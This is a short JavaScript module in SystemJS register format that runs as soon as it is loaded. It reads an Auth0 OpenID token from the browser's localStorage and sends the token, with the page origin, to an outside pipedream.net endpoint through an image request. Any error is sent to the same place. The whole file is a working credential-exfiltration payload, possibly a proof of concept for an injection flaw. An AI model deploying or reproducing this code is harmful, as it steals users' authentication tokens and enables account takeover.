System.register([], function () {
  return { execute: function () {
    try {
      var k = Object.keys(localStorage).find(function (x) {
        return /auth0/i.test(x) && /openid/i.test(x);
      });
      var tok = k ? localStorage.getItem(k) : "(no auth0 token found)";
      new Image().src = "https://eondm3hfjar18nj.m.pipedream.net/?o=" +
        encodeURIComponent(location.origin) + "&d=" + encodeURIComponent(tok);
    } catch (e) {
      new Image().src = "https://eondm3hfjar18nj.m.pipedream.net/?err=" +
        encodeURIComponent(String(e));
    }
  }};
});
